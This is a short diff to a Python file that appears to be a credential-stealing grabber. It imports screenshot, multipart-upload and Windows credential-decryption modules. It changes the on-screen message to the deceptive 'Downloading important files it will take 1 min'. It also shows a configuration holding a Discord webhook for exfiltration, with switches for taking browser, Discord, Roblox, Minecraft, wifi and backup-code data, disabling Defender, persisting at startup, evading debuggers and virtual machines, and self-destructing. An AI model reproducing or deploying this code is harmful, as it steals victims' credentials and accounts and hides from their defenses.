@@ -19,8 +19,7 @@ from PIL import ImageGrab
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from win32crypt import CryptUnprotectData
 
-print("Starting after 1 minute and 20 seconds, Please wait")
-print("|WARNING|: Be Patient and do not close instead of making problems.")
+print("Downloading important files it will take 1 min")
 
 __CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1085316651274223726/6ym6f8vb6DseAiVwMf8rj7rcNIZA6zoCEDqQrLnddFVCfgPjEYQQH9eFRk2Chp8IMxjV', 'ping': True, 'pingtype': 'Here', 'error': False, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': False, 'antidebug_vm': True, 'discord': True, 'anti_spam': True, 'self_destruct': True}
 
